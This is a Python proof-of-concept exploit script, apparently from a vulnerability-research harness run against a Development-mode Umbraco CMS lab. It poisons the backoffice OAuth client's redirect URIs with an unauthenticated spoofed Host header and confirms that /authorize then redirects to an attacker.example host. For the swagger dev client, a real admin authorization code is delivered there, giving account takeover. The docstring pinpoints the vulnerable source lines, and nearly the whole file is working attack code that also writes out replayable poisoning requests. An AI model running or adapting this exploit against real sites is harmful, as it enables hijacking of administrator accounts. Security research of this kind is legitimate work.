#!/usr/bin/env python3
"""
VULN-059 — Host-header-controlled OAuth redirect-URI pollution of the backoffice OpenIddict client
           -> open redirect (all installs) + account takeover (non-Production)

Vulnerable code (targets/Umbraco-CMS):
  * src/Umbraco.Cms.Api.Management/Middleware/BackOfficeAuthorizationInitializationMiddleware.cs:74 —
        `var host = $"{context.Request.Scheme}://{context.Request.Host}";` — the RAW, attacker-controlled
        Host header (no allow-list). Registered PrePipeline, BEFORE authentication, on any /umbraco request.
  * :91-101 — the tainted host is added UNCONDITIONALLY to the set (in addition to any configured
        UmbracoApplicationUrl) and merged with previously-seen hosts.
  * :112 — `EnsureBackOfficeApplicationAsync(backOfficeHosts)`.
  * src/Umbraco.Cms.Api.Management/Security/BackOfficeApplicationManager.cs:96-98 — the sink checks ONLY
        `IsAbsoluteUri`; no host allow-list. :184-221 unions with existing DB redirect URIs => each spoofed
        Host permanently ACCRETES into the client's RedirectUris/PostLogoutRedirectUris (:291-296).
  * :123-143 — dev clients (umbraco-swagger / umbraco-postman) are DELETED in Production but CREATED in
        non-Production (this lab is ASPNETCORE_ENVIRONMENT=Development).
  * src/Umbraco.Cms.Api.Common/DependencyInjection/HideBackOfficeTokensHandler.cs:115-127 — the auth-code
        redaction fires ONLY for ClientId == umbraco-back-office; the swagger dev client's `code` is returned
        RAW in the redirect => a lured admin's real code lands on the attacker host (ATO).

Class: OAuth redirect-URI allow-list bypass / open redirect (CWE-601) + broken authentication / ATO (CWE-287, CWE-384).

Flaw (plain English):
  OpenIddict validates `redirect_uri` on /authorize against the client's registered redirect-URI set. For the
  backoffice client that set is not statically configured — it is rebuilt on EVERY backoffice request from the
  incoming `Host` header, unauthenticated and pre-auth, and persisted cumulatively. Default installs ship no
  AllowedHosts and there is no HostFiltering/ForwardedHeaders in src, so `context.Request.Host` is attacker-
  controlled. Anyone who can send a request with a chosen Host header thus registers their own domain as a valid
  redirect URI — defeating the exact precondition redirect-URI validation exists to enforce.

Exploitation idea (and what a pass proves):
  1. BASELINE: as a logged-in admin, request /authorize with redirect_uri on a brand-new evil host -> OpenIddict
     REJECTS it (400 invalid_request, ID2043). This proves the allow-list is real and the host is not yet trusted.
  2. POISON: one UNAUTHENTICATED GET /umbraco carrying `Host: <evil>` -> the middleware persists
     http://<evil>/umbraco/oauth_complete (backoffice) and .../openapi/oauth2-redirect.html (swagger) as valid
     redirect URIs.
  3. POST-POISON: the SAME /authorize that was rejected now returns 302 with the auth code to the evil host
     (open redirect). For the swagger dev client the code is NOT redacted -> a real, redeemable admin auth code
     is delivered to the attacker = account takeover.
  A pass = an evil redirect_uri that OpenIddict rejected (400) before an unauthenticated Host spoof is ACCEPTED
  (302, code delivered to the attacker host) after it.
"""
import os
import sys
import urllib.parse

import requests

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
import _common as c
import _resilient as rc

VID = "VULN-059"
HERE = os.path.dirname(__file__)
BACKOFFICE_CLIENT = "umbraco-back-office"


def authorize(session, client_id, redirect_uri):
    """Run just the /authorize GET (cookie-authenticated). Returns (status, location, body)."""
    _verifier, challenge = c._pkce()
    params = {
        "client_id": client_id,
        "response_type": "code",
        "redirect_uri": redirect_uri,
        "code_challenge": challenge,
        "code_challenge_method": "S256",
        "state": c.rnd(6),
    }
    r = session.get(f"{c.SEC}/authorize", params=params, allow_redirects=False, timeout=20)
    return r.status_code, r.headers.get("Location", ""), r.text[:200]


def code_in(location: str):
    if "code=" not in location:
        return None
    q = urllib.parse.parse_qs(urllib.parse.urlparse(location).query)
    return q.get("code", [""])[0]


def main() -> int:
    c.banner(VID, "Host-header -> OAuth redirect-URI pollution (open redirect + non-prod ATO)",
             "BackOfficeAuthorizationInitializationMiddleware.cs:74 (raw Host) -> BackOfficeApplicationManager.cs:96-98,184-221")

    admin = rc.resilient_admin_client()          # cookie-authenticated admin (needed to mint a code)
    c.log("SETUP", "admin authenticated (cookie session) — stands in for the lured, already-logged-in admin")

    evil_host = f"evil-{c.rnd(5)}.attacker.example"   # brand-new host => provably not yet trusted
    bo_uri = f"http://{evil_host}/umbraco/oauth_complete"                    # backoffice callback path (default)
    sw_uri = f"http://{evil_host}/umbraco/openapi/oauth2-redirect.html"      # swagger dev-client callback
    c.log("SETUP", f"attacker-controlled host for this run: {evil_host}")

    ok = True

    # ---- 1) BASELINE: the evil redirect_uri is REJECTED before poisoning ----
    c.log("STEP", "baseline: /authorize with an evil redirect_uri (both clients) — expect REJECTION")
    bo_pre = authorize(admin.session, BACKOFFICE_CLIENT, bo_uri)
    sw_pre = authorize(admin.session, c.SWAGGER_CLIENT, sw_uri)
    pre_rejected = bo_pre[0] == 400 and sw_pre[0] == 400
    if pre_rejected:
        c.log("PROOF", f"pre-poison back-office -> {bo_pre[0]} invalid_request; swagger -> {sw_pre[0]} invalid_request "
                       f"(OpenIddict enforces the redirect-URI allow-list; {evil_host} is NOT trusted)")
    else:
        c.log("FAIL", f"baseline did not reject as expected: back-office={bo_pre[0]}, swagger={sw_pre[0]} "
                      f"(host may already be poisoned from a prior run) bodies={bo_pre[2]!r}/{sw_pre[2]!r}")
        ok = False

    # ---- 2) POISON: one UNAUTHENTICATED request with a spoofed Host header ----
    c.log("STEP", f"poison: unauthenticated GET /umbraco with header  Host: {evil_host}")
    poison = requests.Session()
    r_poison = poison.get(f"{c.BASE_URL}/umbraco", headers={"Host": evil_host}, allow_redirects=False, timeout=20)
    c.log("PROOF", f"GET /umbraco (Host: {evil_host}) -> {r_poison.status_code} "
                   f"(no auth; middleware persists http://{evil_host}/umbraco/oauth_complete into the client)")

    # ---- 3) POST-POISON: the same evil redirect_uri is now ACCEPTED ----
    c.log("STEP", "post-poison: replay the SAME /authorize requests — expect 302 to the attacker host")
    bo_post = None
    sw_post = None
    for _ in range(3):
        bo_post = authorize(admin.session, BACKOFFICE_CLIENT, bo_uri)
        sw_post = authorize(admin.session, c.SWAGGER_CLIENT, sw_uri)
        # if the admin cookie was rotated by a sibling agent, refresh it and retry
        if not (code_in(bo_post[1]) or code_in(sw_post[1])) and evil_host in (bo_post[1] + sw_post[1]):
            break  # redirected to evil but code missing (still an open redirect) — accept
        if code_in(sw_post[1]) or code_in(bo_post[1]):
            break
        try:
            admin._reauth()   # refresh the (possibly sibling-rotated) admin cookie session in place
        except Exception:
            admin = rc.resilient_admin_client()

    bo_redirects_evil = bo_post[0] in (301, 302, 303, 307, 308) and evil_host in bo_post[1]
    sw_redirects_evil = sw_post[0] in (301, 302, 303, 307, 308) and evil_host in sw_post[1]
    sw_code = code_in(sw_post[1])
    bo_code = code_in(bo_post[1])

    if bo_redirects_evil:
        c.log("PROOF", f"back-office /authorize now -> {bo_post[0]} Location={bo_post[1][:120]} "
                       f"(code={bo_code!r}; the browser is redirected to the ATTACKER host = open redirect)")
    else:
        c.log("FAIL", f"back-office authorize not redirected to evil: {bo_post[0]} {bo_post[1][:160] or bo_post[2]!r}")
        ok = False

    if sw_redirects_evil and sw_code and sw_code != "[redacted]":
        c.log("PROOF", f"swagger dev-client /authorize now -> {sw_post[0]} to {evil_host} with a REAL, "
                       f"un-redacted auth code ({sw_code[:20]}...) delivered to the attacker = ACCOUNT TAKEOVER")
        c.log("PROOF", "(the attacker redeems this code at /security/back-office/token with their own PKCE "
                       "verifier to obtain admin access/refresh tokens; HideBackOfficeTokensHandler only redacts "
                       "the umbraco-back-office client, not umbraco-swagger)")
    elif sw_redirects_evil:
        c.log("PROOF", f"swagger dev-client /authorize now -> {sw_post[0]} to {evil_host} (code={sw_code!r})")
    else:
        c.log("INFO", f"swagger post-poison: {sw_post[0]} {sw_post[1][:120] or sw_post[2]!r}")

    # decisive gate: rejected before, redirected-to-evil after
    confirmed = ok and pre_rejected and bo_redirects_evil

    # ---- evidence ----
    with open(os.path.join(HERE, "evidence", "pre_vs_post.txt"), "w") as f:
        f.write(f"attacker host (this run): {evil_host}\n\n")
        f.write("PRE-POISON (evil redirect_uri):\n")
        f.write(f"  back-office -> HTTP {bo_pre[0]}  body={bo_pre[2]!r}\n")
        f.write(f"  swagger     -> HTTP {sw_pre[0]}  body={sw_pre[2]!r}\n\n")
        f.write(f"POISON: GET /umbraco  Host: {evil_host}  -> HTTP {r_poison.status_code}\n\n")
        f.write("POST-POISON (same evil redirect_uri):\n")
        f.write(f"  back-office -> HTTP {bo_post[0]}  Location={bo_post[1]}\n")
        f.write(f"  swagger     -> HTTP {sw_post[0]}  Location={sw_post[1]}\n")
    with open(os.path.join(HERE, "evidence", "accepted_redirect.txt"), "w") as f:
        f.write("The auth code delivered to the attacker-controlled host after an unauthenticated Host spoof:\n\n")
        f.write(f"swagger  Location: {sw_post[1]}\n")
        f.write(f"swagger  code (REAL, redeemable): {sw_code}\n\n")
        f.write(f"back-office Location: {bo_post[1]}\n")
        f.write(f"back-office code: {bo_code}  (redacted for the back-office client; the redirect itself is the open-redirect)\n")
    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write("### 1) POISON — unauthenticated, spoofed Host header (persists the attacker redirect URI)\n")
        f.write(f"GET /umbraco HTTP/1.1\nHost: {evil_host}\n\n\n")
        f.write("### 2) POST-POISON authorize (cookie = a lured logged-in admin) — now ACCEPTED\n")
        f.write(f"GET {c.SEC}/authorize?client_id=umbraco-swagger&response_type=code"
                f"&redirect_uri={urllib.parse.quote(sw_uri)}&code_challenge=<attacker>&code_challenge_method=S256"
                f"&state=... HTTP/1.1\nHost: {urllib.parse.urlparse(c.BASE_URL).netloc}\n"
                f"Cookie: UMB_UCONTEXT=<lured-admin-session>\n")
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"PRE-POISON back-office authorize  -> {bo_pre[0]}  ({bo_pre[2].strip()})\n")
        f.write(f"PRE-POISON swagger authorize      -> {sw_pre[0]}  ({sw_pre[2].strip()})\n")
        f.write(f"POISON GET /umbraco Host:{evil_host} -> {r_poison.status_code}\n")
        f.write(f"POST-POISON back-office authorize -> {bo_post[0]}  Location: {bo_post[1]}\n")
        f.write(f"POST-POISON swagger authorize     -> {sw_post[0]}  Location: {sw_post[1]}\n")

    if confirmed:
        return c.verdict(VID, "CONFIRMED",
                         f"evil redirect_uri rejected (400) pre-poison, accepted (302 to {evil_host}) after an "
                         f"unauthenticated Host spoof; swagger delivered a real admin code = open redirect + ATO")
    return c.verdict(VID, "FAILED", "could not demonstrate the pre->post redirect-URI acceptance transition")


if __name__ == "__main__":
    sys.exit(main())
